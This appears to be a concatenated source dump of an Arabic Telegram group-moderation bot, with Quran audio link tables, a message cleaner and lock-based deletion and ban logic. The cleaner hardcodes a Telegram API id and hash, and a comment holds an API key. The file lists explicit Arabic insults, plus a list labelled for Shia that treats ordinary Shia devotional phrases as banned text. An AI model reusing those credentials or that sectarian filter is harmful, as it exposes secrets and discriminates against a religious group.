الاخلاص", "سورة الفلق", "سورة الناس"]

MaherAlmaikulai = {
	"سورة الفاتحه": "https://t.me/MaherSounds/2",
	"سورة البقره": "https://t.me/MaherSounds/3",
	"سورة ال عمران": "https://t.me/MaherSounds/4",
	"سورة النساء": "https://t.me/MaherSounds/5",
	"سورة المائده": "https://t.me/MaherSounds/6",
	"سورة الانعام": "https://t.me/MaherSounds/7",
	"سورة الاعراف": "https://t.me/MaherSounds/8",
	"سورة الانفال": "https://t.me/MaherSounds/9",
	"سورة التوبه": "https://t.me/MaherSounds/10",
	"سورة يونس": "https://t.me/MaherSounds/11",
	"سورة هود": "https://t.me/MaherSounds/12",
	"سورة يوسف": "https://t.me/MaherSounds/13",
	"سورة الرعد": "https://t.me/MaherSounds/14",
	"سورة ابراهيم": "https://t.me/MaherSounds/15",
	"سورة الحجر": "https://t.me/MaherSounds/16",
	"سورة النحل": "https://t.me/MaherSounds/17",
	"سورة الاسراء": "https://t.me/MaherSounds/18",
	"سورة الكهف": "https://t.me/MaherSounds/19",
	"سورة مريم": "https://t.me/MaherSounds/20",
	"سورة طه": "https://t.me/MaherSounds/21",
	"سورة الانبياء": "https://t.me/MaherSounds/22",
	"سورة الحج": "https://t.me/MaherSounds/23",
	"سورة المؤمنون": "https://t.me/MaherSounds/24",
	"سورة النور": "https://t.me/MaherSounds/25",
	"سورة الفرقان": "https://t.me/MaherSounds/26",
	"سورة الشعراء": "https://t.me/MaherSounds/27",
	"سورة النمل": "https://t.me/MaherSounds/28",
	"سورة القصص": "https://t.me/MaherSounds/29",
	"سورة العنكبوت": "https://t.me/MaherSounds/30",
	"سورة الروم": "https://t.me/MaherSounds/31",
	"سورة لقمان": "https://t.me/MaherSounds/32",
	"سورة السجده": "https://t.me/MaherSounds/33",
	"سورة الاحزاب": "https://t.me/MaherSounds/34",
	"سورة سبا": "https://t.me/MaherSounds/35",
	"سورة فاطر": "https://t.me/MaherSounds/36",
	"سورة يس": "https://t.me/MaherSounds/37",
	"سورة الصافات": "https://t.me/MaherSounds/38",
	"سورة ص": "https://t.me/MaherSounds/39",
	"سورة الزمر": "https://t.me/MaherSounds/40",
	"سورة غافر": "https://t.me/MaherSounds/41",
	"سورة فصلت": "https://t.me/MaherSounds/42",
	"سورة الشورى": "https://t.me/MaherSounds/43",
	"سورة الزخرف": "https://t.me/MaherSounds/44",
	"سورة الدخان": "https://t.me/MaherSounds/45",
	"سورة الجاثيه": "https://t.me/MaherSounds/46",
	"سورة الاحقاف": "https://t.me/MaherSounds/47",
	"سورة محمد": "https://t.me/MaherSounds/48",
	"سورة الفتح": "https://t.me/MaherSounds/49",
	"سورة الحجرات": "https://t.me/MaherSounds/50",
	"سورة ق": "https://t.me/MaherSounds/51",
	"سورة الذريات": "https://t.me/MaherSounds/52",
	"سورة الطور": "https://t.me/MaherSounds/53",
	"سورة النجم": "https://t.me/MaherSounds/54",
	"سورة القمر": "https://t.me/MaherSounds/55",
	"سورة الرحمن": "https://t.me/MaherSounds/56",
	"سورة الواقعه": "https://t.me/MaherSounds/57",
	"سورة الحديد": "https://t.me/MaherSounds/58",
	"سورة المجادله": "https://t.me/MaherSounds/59",
	"سورة الحشر": "https://t.me/MaherSounds/60",
	"سورة الممتحنه": "https://t.me/MaherSounds/61",
	"سورة الصف": "https://t.me/MaherSounds/62",
	"سورة الجمعه": "https://t.me/MaherSounds/63",
	"سورة المنافقون": "https://t.me/MaherSounds/64",
	"سورة التغابن": "https://t.me/MaherSounds/65",
	"سورة الطلاق": "https://t.me/MaherSounds/66",
	"سورة التحريم": "https://t.me/MaherSounds/67",
	"سورة الملك": "https://t.me/MaherSounds/68",
	"سورة القلم": "https://t.me/MaherSounds/69",
	"سورة الحاقه": "https://t.me/MaherSounds/70",
	"سورة المعارج": "https://t.me/MaherSounds/71",
	"سورة نوح": "https://t.me/MaherSounds/72",
	"سورة الجن": "https://t.me/MaherSounds/73",
	"سورة المزمل": "https://t.me/MaherSounds/74",
	"سورة المدثر": "https://t.me/MaherSounds/75",
	"سورة القيامه": "https://t.me/MaherSounds/76",
	"سورة الانسان": "https://t.me/MaherSounds/77",
	"سورة المرسلات": "https://t.me/MaherSounds/78",
	"سورة النبا": "https://t.me/MaherSounds/79",
	"سورة النازعات": "https://t.me/MaherSounds/80",
	"سورة عبس": "https://t.me/MaherSounds/81",
	"سورة التكوير": "https://t.me/MaherSounds/82",
	"سورة الانفطار": "https://t.me/MaherSounds/83",
	"سورة المطففين": "https://t.me/MaherSounds/84",
	"سورة الانشقاق": "https://t.me/MaherSounds/85",
	"سورة البروج": "https://t.me/MaherSounds/86",
	"سورة الطارق": "https://t.me/MaherSounds/87",
	"سورة الاعلى": "https://t.me/MaherSounds/88",
	"سورة الغاشيه": "https://t.me/MaherSounds/89",
	"سورة الفجر": "https://t.me/MaherSounds/90",
	"سورة البلد": "https://t.me/MaherSounds/91",
	"سورة الشمس": "https://t.me/MaherSounds/92",
	"سورة الليل": "https://t.me/MaherSounds/93",
	"سورة الضحى": "https://t.me/MaherSounds/94",
	"سورة الشرح": "https://t.me/MaherSounds/95",
	"سورة التين": "https://t.me/MaherSounds/96",
	"سورة العلق": "https://t.me/MaherSounds/97",
	"سورة القدر": "https://t.me/MaherSounds/98",
	"سورة البينه": "https://t.me/MaherSounds/99",
	"سورة الزلزله": "https://t.me/MaherSounds/100",
	"سورة العاديات": "https://t.me/MaherSounds/101",
	"سورة القارعه": "https://t.me/MaherSounds/102",
	"سورة التكاثر": "https://t.me/MaherSounds/103",
	"سورة العصر": "https://t.me/MaherSounds/104",
	"سورة الهمزه": "https://t.me/MaherSounds/105",
	"سورة الفيل": "https://t.me/MaherSounds/106",
	"سورة قريش": "https://t.me/MaherSounds/107",
	"سورة الماعون": "https://t.me/MaherSounds/108",
	"سورة الكوثر": "https://t.me/MaherSounds/109",
	"سورة الكافرون": "https://t.me/MaherSounds/110",
	"سورة النصر": "https://t.me/MaherSounds/111",
	"سورة المسد": "https://t.me/MaherSounds/112",
	"سورة الاخلاص": "https://t.me/MaherSounds/113",
	"سورة الفلق": "https://t.me/MaherSounds/114",
	"سورة الناس": "https://t.me/MaherSounds/115",
}
# ==================== FILE: utils.py ====================

async def shell_exec(code):
    process = await asyncio.create_subprocess_shell(
        code, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT
    )

    stdout = (await process.communicate())[0].decode().strip()
    return stdout, process

async def cssworker_url(target_url: str):
    url = "https://htmlcsstoimage.com/demo_run"
    my_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0",
    }

    data = {
        "url": target_url,
        # Sending a random CSS to make the API to generate a new screenshot.
        "css": f"random-tag: {uuid.uuid4()}",
        "render_when_ready": False,
        "viewport_width": 1280,
        "viewport_height": 720,
        "device_scale": 1,
    }

    try:
        resp = await http.post(url, headers=my_headers, json=data)
        return resp.json()
    except HTTPError:
        return None
# ==================== FILE: clean.py ====================
###############################
# ███████╗░█████╗░██╗██████╗░ #
# ╚════██║██╔══██╗██║██╔══██╗ #
# ░░███╔═╝███████║██║██║░░██║ #
# ██╔══╝░░██╔══██║██║██║░░██║ #
# ███████╗██║░░██║██║██████╔╝ #
# ╚══════╝╚═╝░░╚═╝╚═╝╚═════╝░ #
##############################
#   https://t.me/DevZaid      #
###############################

chats_db = {}
db = redis.Redis(decode_responses=True)

DevZaid = Client(
    "cleaner",
    13251350,
    "66c0eacb36f9979ae6d153f207565cd6",
    bot_token=token,
    in_memory=True
)
# ZAID = token.split(':')[0]


@DevZaid.on_message(filters.group & filters.media, group=1)
async def add_messages(c: Client, m: Message):
    chat_id = str(m.chat.id)
    if m.from_user:
        id = m.from_user.id
        mention = m.from_user.mention
    elif m.sender_chat:
        id = m.sender_chat.id
        mention = m.sender_chat.title
    
    if m.chat.id not in chats_db:
        chats_db[m.chat.id]=[]
    
    if (m.media) and not m.audio and not m.voice and not m.game:
        if await db.hget(ZAID+str(m.chat.id), "ena-clean"):
            secs = int(await db.hget(ZAID+chat_id, "clean-secs") or "60")
            time_now = datetime.now()
            data = {"id":m.id, "time":time_now + timedelta(seconds=secs)}
            chats_db[m.chat.id].append(data)
            
    
    if m.media_group_id and await db.hget(ZAID+str(m.chat.id), "ena-clean"):
        secs = int(await db.hget(ZAID+chat_id, "clean-secs") or "60")
        time_now = datetime.now()
        msgs = await c.get_media_group(m.chat.id, m.id)
        for msg in msgs:
            data = {"id":msg.id, "time":time_now + timedelta(seconds=secs)}
            chats_db[m.chat.id].append(data)
    
    # print(chats_db)

async def auto_clean_function():
    while not await asyncio.sleep(1.7):
        try:
            for chat_id in chats_db:
                msgs_ids = []
                for msg in chats_db[chat_id]:
                    if datetime.now() > msg["time"]:
                        msgs_ids.append(msg['id'])
                        chats_db[chat_id].remove(msg)
                try:
                    await DevZaid.delete_messages(chat_id, msgs_ids)
                except FloodWait as flood:
                    await asyncio.sleep(flood.value)
                except Exception:
                    continue
        except Exception as e:
            print(e)

async def main():
    await DevZaid.start()
    print(DevZaid.me.username)
    asyncio.create_task(auto_clean_function())
    await idle()
    
if __name__ == "__main__":
    asyncio.get_event_loop().run_until_complete(main())


# ==================== FILE: all.py ====================
"""


██████╗░██████╗░██████╗░
██╔══██╗╚════██╗██╔══██╗
██████╔╝░█████╔╝██║░░██║
██╔══██╗░╚═══██╗██║░░██║
██║░░██║██████╔╝██████╔╝
╚═╝░░╚═╝╚═════╝░╚═════╝░


[ = This plugin is a part from R3D Source code = ]
{"Developer":"https://t.me/yqyqy66"}


"""


# from googletrans import Translator as googletranstr
# from main import TelegramBot

# ARQ_API_KEY = "OZJRWV-SAURXD-PMBUKF-GMVSNS-ARQ"
# ARQ_API_URL = "https://arq.hamker.dev"

# translator = googletranstr()


list_UwU = [
    "كس",
    "كسمك",
    "كسختك",
    "عير",
    "كسخالتك",
    "خرا بالله",
    "عير بالله",
    "كسخواتكم",
    "كحاب",
    "مناويج",
    "مناويج",
    "كحبه",
    "ابن الكحبه",
    "فرخ",
    "فروخ",
    "طيزك",
    "طيزختك",
    "كسمك",
    "يا ابن الخول",
    "المتناك",
    "شرموط",
    "شرموطه",
    "ابن الشرموطه",
    "ابن الخول",
    "ابن العرص",
    "منايك",
    "متناك",
    "ابن المتناكه",
    "زبك",
    "عرص",
    "زبي",
    "خول",
    "لبوه",
    "لباوي",
    "ابن اللبوه",
    "منيوك",
    "كسمكك",
    "متناكه",
    "يا عرص",
    "يا خول",
    "قحبه",
    "القحبه",
    "شراميط",
    "العلق",
    "العلوق",
    "العلقه",
    "كسمك",
    "يا ابن الخول",
    "المتناك",
    "شرموط",
    "شرموطه",
    "ابن الشرموطه",
    "ابن الخول",
    "االمنيوك",
    "كسمككك",
    "الشرموطه",
    "ابن العرث",
    "ابن الحيضانه",
    "زبك",
    "خول",
    "زبي",
    "قاحب",
]

list_Shiaa = [
    "يا علي",
    "يا حسين",
    "ياعلي",
    "ياحسين",
    "علي ولي الله",
    "عليا ولي الله",
    "عائشه زانيه",
    "عائشة زانية",
    "عائشة عاهرة",
    "عائشه عاهره",
    "خرب ربك",
    "خرب الله",
    "يلعن ربك",
    "يلعن الله",
    "يا عمر",
    "ياعمر",
    "يا محمد",
    "يامحمد",
    "زوجات الرسول",
    "عير بالسنة",
    "عير بالسنه",
    "خرب السنه",
    "خرا بالسنه",
    "خرب السنة",
    "خرا بالسنة",
    "والحسين",
    "والعباس",
    "وعلي",
    "والامام علي",
    "ربنا علي",
    "علي الله",
    "الله علي",
    "رب علي",
    "علي رب",
]


def Find(text):
    m = r"(?i)\b((?:https?://|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}/)(?:[^\s()<>]+|\(([^\s()<>]+|(\([^\s()<>]+\)))*\))+(?:\(([^\s()<>]+|(\([^\s()<>]+\)))*\)|[^\s!()\[\]{};:'\".,<>?«»“”‘’]))"
    url = re.findall(m, text)
    return [x[0] for x in url]


"""
         r.get(f'{m.chat.id}:mute:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockJoin:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockChannels:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockEdit:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockEditM:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockVoice:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockVideo:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockNot:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockPhoto:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockStickers:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockAnimations:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockFiles:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockPersian:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockUrls:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockHashtags:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockMessages:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockTags:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockBots:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockSpam:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockInline:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockForward:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockAudios:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockaddContacts:{Dev_Zaid}')
         r.get(f'{m.chat.id}:lockSHTM:{Dev_Zaid}')
"""



@Client.on_message(filters.group, group=-1111111111111)
async def on_zbi(c: Client, m: Message):
    name = r.get(f"{Dev_Zaid}:BotName") if r.get(f"{Dev_Zaid}:BotName") else "ليو"
    text = m.text
    if text.startswith(f"{name} "):
        text = text.replace(f"{name} ", "")
    if r.get(f"{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}"):
        text = r.get(f"{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}")
    if r.get(f"Custom:{Dev_Zaid}&text={text}"):
        text = r.get(f"Custom:{Dev_Zaid}&text={text}")

    if r.get(f"inDontCheck:{Dev_Zaid}"):
        return m.continue_propagation()

    if dev_pls(m.from_user.id, m.chat.id):
        return

    if (
        text.startswith("تفعيل ")
        or text.startswith("تعطيل ")
        or text.startswith("قفل ")
        or text.startswith("فتح ")
        or text == "ايدي"
        or text == "الاوامر"
    ):
        if r.get(f"forceChannel:{Dev_Zaid}") and (
            not r.get(f"disableSubscribe:{Dev_Zaid}")
        ):
            username = r.get(f"forceChannel:{Dev_Zaid}").replace("@", "")
            not_member = False
            try:
                member = await c.get_chat_member(username, m.from_user.id)
            except FloodWait:
                return m.continue_propagation()
            except UserNotParticipant:
                await m.reply(
                    f"- انضم للقناة ( @{username} ) لتستطيع استخدام اوامر البوت",
                    reply_markup=InlineKeyboardMarkup(
                        [
                            [
                                InlineKeyboardButton(
                                    "اضغط هنا", url="https://t.me/" + username
                                )
                            ]
                        ]
                    ),
                )
                r.set(f"inDontCheck:{Dev_Zaid}", 1, ex=10)
                return m.stop_propagation()
            except Exception as e:
                print(e)
                return m.continue_propagation()

            if member.status in {
                enums.ChatMemberStatus.LEFT,
                enums.ChatMemberStatus.BANNED,
            } or member.status is None:
                not_member = True
            else:
                not_member = False

            if not_member:
                await m.reply(
                    f"- انضم للقناة ( @{username} ) لتستطيع استخدام اوامر البوت",
                    reply_markup=InlineKeyboardMarkup(
                        [
                            [
                                InlineKeyboardButton(
                                    "اضغط هنا", url="https://t.me/" + username
                                )
                            ]
                        ]
                    ),
                )
                r.set(f"inDontCheck:{Dev_Zaid}", ex=10)
                return m.stop_propagation()
            else:
                return m.continue_propagation()


@Client.on_message(filters.group, group=27)
def guardLocksResponse(c, m):
    k = r.get(f"{Dev_Zaid}:botkey")
    channel = (
        r.get(f"{Dev_Zaid}:BotChannel") if r.get(f"{Dev_Zaid}:BotChannel") else "YQYQY6"
    )
    Thread(target=guardResponseFunction, args=(c, m, k, channel)).start()


@Client.on_edited_message(filters.group, group=27)
def guardLocksResponse2(c, m):
    k = r.get(f"{Dev_Zaid}:botkey")
    channel = (
        r.get(f"{Dev_Zaid}:BotChannel") if r.get(f"{Dev_Zaid}:BotChannel") else "YQYQY6"
    )
    Thread(target=guardResponseFunction2, args=(c, m, k, channel)).start()


def guardResponseFunction2(c, m, k, channel):
    if not r.get(f"{m.chat.id}:enable:{Dev_Zaid}"):
        return
    warner = """
「 {} 」
{} ممنوع {}
☆
"""
    warn = False
    reason = False

    if m.sender_chat:
        id = m.sender_chat.id
        mention = f"[{m.sender_chat.title}](t.me/{channel})"
    if m.from_user:
        id = m.from_user.id
        mention = m.from_user.mention

    if (
        r.get(f"{m.chat.id}:lockEdit:{Dev_Zaid}")
        and m.text
        and not pre_pls(id, m.chat.id)
    ):
        m.delete()
        warn = True
        reason = "التعديل"
        if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}") and not r.get(
            f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}"
        ):
            r.set(f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}", 1, ex=60)
            return m.reply(
                warner.format(mention, k, reason), disable_web_page_preview=True
            )

    if (
        r.get(f"{m.chat.id}:lockEditM:{Dev_Zaid}")
        and m.media
        and not pre_pls(id, m.chat.id)
    ):
        m.delete()
        warn = True
        reason = "تعديل الميديا"
        if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}") and not r.get(
            f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}"
        ):
            r.set(f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}", 1, ex=60)
            return m.reply(
                warner.format(mention, k, reason), disable_web_page_preview=True
            )


def guardResponseFunction(c, m, k, channel):
    if not r.get(f"{m.chat.id}:enable:{Dev_Zaid}"):
        return
    warner = """
「 {} 」
{} ممنوع {}
☆
"""
    warn = False
    reason = False

    if r.get(f"{m.chat.id}:lockNot:{Dev_Zaid}") and m.service:
        m.delete()

    if (
        r.get(f"{m.chat.id}:lockaddContacts:{Dev_Zaid}")
        and m.from_user
        and m.new_chat_members
    ):
        if pre_pls(m.from_user.id, m.chat.id):
            return
        for me in m.new_chat_members:
            if not me.id == m.from_user.id:
                warn = True
                mention = m.from_user.mention
                m.chat.ban_member(me.id)
                reason = "تضيف حد هنا"
                m.delete()
                if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}"):
                    return m.reply(
                        warner.format(mention, k, reason), disable_web_page_preview=True
                    )

    if m.sender_chat:
        id = m.sender_chat.id
        mention = f"[{m.sender_chat.title}](t.me/{channel})"
    if m.from_user:
        id = m.from_user.id
        mention = m.from_user.mention

    # print(id)

    if m.media:
        rep = m
        if rep.sticker:
            file_id = rep.sticker.file_id
        if rep.animation:
            file_id = rep.animation.file_id
        if rep.photo:
            file_id = rep.photo.file_id
        if rep.video:
            file_id = rep.video.file_id
        if rep.voice:
            file_id = rep.voice.file_id
        if rep.audio:
            file_id = rep.audio.file_id
        if rep.document:
            file_id = rep.document.file_id
        idd = file_id[-6:]
        if r.get(f"{idd}:NotAllow:{m.chat.id}{Dev_Zaid}"):
            if not admin_pls(id, m.chat.id):
                return m.delete()

    if m.text and r.smembers(f"{m.chat.id}:NotAllowedListText:{Dev_Zaid}"):
        if not admin_pls(id, m.chat.id):
            for word in r.smembers(f"{m.chat.id}:NotAllowedListText:{Dev_Zaid}"):
                if word in m.text:
                    return m.delete()

    if r.get(f"{id}:mute:{m.chat.id}{Dev_Zaid}") or r.get(f"{id}:mute:{Dev_Zaid}"):
        return False

    if r.get(f"{m.chat.id}:mute:{Dev_Zaid}") and not admin_pls(id, m.chat.id):
        m.delete()
        return False

    if pre_pls(id, m.chat.id):
        return False

    if r.get(f"{m.chat.id}:lockBots:{Dev_Zaid}") and m.new_chat_members:
        for mem in m.new_chat_members:
            if mem.is_bot:
                return m.chat.ban_member(mem.id)

    if r.get(f"{m.chat.id}:lockJoin:{Dev_Zaid}") and m.new_chat_members:
        for mem in m.new_chat_members:
            if not admin_pls(mem.id, m.chat.id):
                m.chat.ban_member(mem.id)
                m.chat.unban_member(mem.id)
                return False

    if r.get(f"{m.chat.id}:lockChannels:{Dev_Zaid}") and m.sender_chat:
        if not m.sender_chat.id == m.chat.id:
            m.chat.ban_member(m.sender_chat.id)
            return False

    if r.get(f"{m.chat.id}:lockSpam:{Dev_Zaid}"):
        if not r.get(f"{id}in_spam:{m.chat.id}{Dev_Zaid}"):
            r.set(f"{id}in_spam:{m.chat.id}{Dev_Zaid}", 1, ex=10)
        else:
            if int(r.get(f"{id}in_spam:{m.chat.id}{Dev_Zaid}")) == 10:
                if m.from_user:
                    r.set(f"{id}:mute:{m.chat.id}{Dev_Zaid}", 1)
                    r.sadd(f"{m.chat.id}:listMUTE:{Dev_Zaid}", id)
                    r.delete(f"{id}in_spam:{m.chat.id}{Dev_Zaid}")
                    return m.reply(
                        f"「 {mention} 」 \n{k} كتمتك يالبثر عشان تتعلم تكرر\n☆"
                    )

                if m.sender_chat:
                    m.chat.ban_member(m.sender_chat)
                    return m.reply(
                        f"「 {mention} 」 {k} حظرتك يالبثر عشان تتعلم تكرر\n☆"
                    )
            else:
                get = int(r.get(f"{id}in_spam:{m.chat.id}{Dev_Zaid}"))
                r.set(f"{id}in_spam:{m.chat.id}{Dev_Zaid}", get + 1, ex=10)

    if r.get(f"{m.chat.id}:lockInline:{Dev_Zaid}") and m.via_bot:
        m.delete()
        warn = True
        reason = "ترسل انلاين"
        if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}") and not r.get(
            f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}"
        ):
            r.set(f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}", 1, ex=60)
            return m.reply(
                warner.format(mention, k, reason), disable_web_page_preview=True
            )

    if r.get(f"{m.chat.id}:lockForward:{Dev_Zaid}") and m.forward_date:
        m.delete()
        warn = True
        reason = "ترسل توجيه"
        if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}") and not r.get(
            f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}"
        ):
            r.set(f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}", 1, ex=60)
            return m.reply(
                warner.format(mention, k, reason), disable_web_page_preview=True
            )

    """
  if r.get(f'{m.chat.id}:lockForward:{Dev_Zaid}') and m.forward_from_chat:
     m.delete()
     warn = True
     reason = 'ترسل توجيه'
     if not r.get(f'{m.chat.id}:disableWarn:{Dev_Zaid}') and not r.get(f'{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}'):
        r.set(f'{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}',1,ex=60)
        return m.reply(warner.format(mention,k,reason),disable_web_page_preview=True)
  """

    if r.get(f"{m.chat.id}:lockAudios:{Dev_Zaid}") and m.audio:
        m.delete()
        warn = True
        reason = "ترسل صوت"
        if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}") and not r.get(
            f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}"
        ):
            r.set(f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}", 1, ex=60)
            return m.reply(
                warner.format(mention, k, reason), disable_web_page_preview=True
            )

    if r.get(f"{m.chat.id}:lockVideo:{Dev_Zaid}") and m.video:
        m.delete()
        warn = True
        reason = "ترسل فيديوهات"
        if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}") and not r.get(
            f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}"
        ):
            r.set(f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}", 1, ex=60)
            return m.reply(
                warner.format(mention, k, reason), disable_web_page_preview=True
            )

    if r.get(f"{m.chat.id}:lockPhoto:{Dev_Zaid}") and m.photo:
        m.delete()
        warn = True
        reason = "ترسل صور"
        if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}") and not r.get(
            f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}"
        ):
            r.set(f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}", 1, ex=60)
            return m.reply(
                warner.format(mention, k, reason), disable_web_page_preview=True
            )

    if r.get(f"{m.chat.id}:lockStickers:{Dev_Zaid}") and m.sticker:
        m.delete()
        warn = True
        reason = "ترسل ملصقات"
        if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}") and not r.get(
            f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}"
        ):
            r.set(f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}", 1, ex=60)
            return m.reply(
                warner.format(mention, k, reason), disable_web_page_preview=True
            )

    if r.get(f"{m.chat.id}:lockAnimations:{Dev_Zaid}") and m.animation:
        m.delete()
        warn = True
        reason = "ترسل متحركات"
        if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}") and not r.get(
            f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}"
        ):
            r.set(f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}", 1, ex=60)
            return m.reply(
                warner.format(mention, k, reason), disable_web_page_preview=True
            )

    if r.get(f"{m.chat.id}:lockFiles:{Dev_Zaid}") and m.document:
        m.delete()
        warn = True
        reason = "ترسل ملفات"
        if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}") and not r.get(
            f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}"
        ):
            r.set(f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}", 1, ex=60)
            return m.reply(
                warner.format(mention, k, reason), disable_web_page_preview=True
            )

    if r.get(f"{m.chat.id}:lockPersian:{Dev_Zaid}") and m.text:
        if "ه‍" in m.text or "ی" in m.text or "ک" in m.text or "چ" in m.text:
            m.delete()
            warn = True
            reason = "ترسل فارسي"
            if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}"):
                return m.reply(
                    warner.format(mention, k, reason), disable_web_page_preview=True
                )

    if r.get(f"{m.chat.id}:lockPersian:{Dev_Zaid}") and m.caption:
        if "ه‍" in m.caption or "ی" in m.caption or "ک" in m.caption or "چ" in m.caption:
            m.delete()
            warn = True
            reason = "ترسل فارسي"
            if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}"):
                return m.reply(
                    warner.format(mention, k, reason), disable_web_page_preview=True
                )

    if (
        r.get(f"{m.chat.id}:lockUrls:{Dev_Zaid}")
        and m.text
        and len(Find(m.text.html)) > 0
    ):
        m.delete()
        warn = True
        reason = "ترسل روابط"
        if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}") and not r.get(
            f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}"
        ):
            r.set(f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}", 1, ex=60)
            return m.reply(
                warner.format(mention, k, reason), disable_web_page_preview=True
            )

    if (
        r.get(f"{m.chat.id}:lockHashtags:{Dev_Zaid}")
        and m.text
        and len(re.findall(r"#(\w+)", m.text)) > 0
    ):
        m.delete()
        warn = True
        reason = "ترسل هاشتاق"
        if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}") and not r.get(
            f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}"
        ):
            r.set(f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}", 1, ex=60)
            return m.reply(
                warner.format(mention, k, reason), disable_web_page_preview=True
            )

    if r.get(f"{m.chat.id}:lockMessages:{Dev_Zaid}") and m.text and len(m.text) > 150:
        m.delete()
        warn = True
        reason = "ترسل كلام كثير"
        if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}") and not r.get(
            f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}"
        ):
            r.set(f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}", 1, ex=60)
            return m.reply(
                warner.format(mention, k, reason), disable_web_page_preview=True
            )

    if r.get(f"{m.chat.id}:lockVoice:{Dev_Zaid}") and m.voice:
        m.delete()
        warn = True
        reason = "ترسل فويس"
        if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}") and not r.get(
            f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}"
        ):
            r.set(f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}", 1, ex=60)
            return m.reply(
                warner.format(mention, k, reason), disable_web_page_preview=True
            )

    if r.get(
        f"{m.chat.id}:lockTags:{Dev_Zaid}"
    ) and '"type": "MessageEntityType.MENTION"' in str(m):
        m.delete()
        warn = True
        reason = "ترسل منشنات"
        if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}") and not r.get(
            f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}"
        ):
            r.set(f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}", 1, ex=60)
            return m.reply(
                warner.format(mention, k, reason), disable_web_page_preview=True
            )

    if r.get(f"{m.chat.id}:lockSHTM:{Dev_Zaid}") and (m.caption or m.text):
        if m.caption:
            txt = m.caption
        if m.text:
            txt = m.text
        for a in list_UwU:
            if txt == a or f" {a} " in txt or a in txt:
                m.delete()
                warn = True
                reason = "السب هنا"
                if not r.get(f"{m.chat.id}:disableWarn:{Dev_Zaid}") and not r.get(
                    f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}"
                ):
                    r.set(f"{Dev_Zaid}:inWARN:{m.from_user.id}{m.chat.id}", 1, ex=60)
                    return m.reply(
                        warner.format(mention, k, reason), disable_web_page_preview=True
                    )

    """
